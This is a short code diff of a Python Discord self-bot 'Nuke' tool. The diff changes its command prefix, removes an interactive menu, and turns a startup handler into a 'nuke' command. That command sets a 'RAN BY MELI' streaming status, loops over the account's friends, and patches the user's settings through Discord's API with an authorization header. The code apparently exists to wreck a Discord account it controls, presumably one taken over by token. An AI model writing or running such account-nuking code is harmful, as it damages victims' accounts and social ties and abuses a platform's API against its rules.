@@ -8,7 +8,7 @@ import json
 import os
 colorama.init()
 
-meli = discord.Client(command_prefix="meli", self_bot=True);
+meli = discord.Client(command_prefix=",", self_bot=True);
 
 
 
@@ -32,15 +32,6 @@ def main():
  [1]: Nuke
     ''')
 main();
-option = input("Select an Option> ");
-
-if option == "1":
-    print("nuking time");
-else:
-    print("Not a valid option...");
-    time.sleep(1);
-    os.system("cls");
-    main();
 
 
 
@@ -55,8 +46,8 @@ def hehe():
 		requests.patch("https://canary.discord.com/api/v8/users/@me/settings", headers=headers, json=payload);
 
     
-@meli.event
-async def on_ready():
+@meli.command()
+async def nuke():
     await meli.change_presence(activity=discord.Streaming(name="RAN BY MELI", url="https://www.twitch.tv/meli"))
     for user in meli.user.friends:
         try:
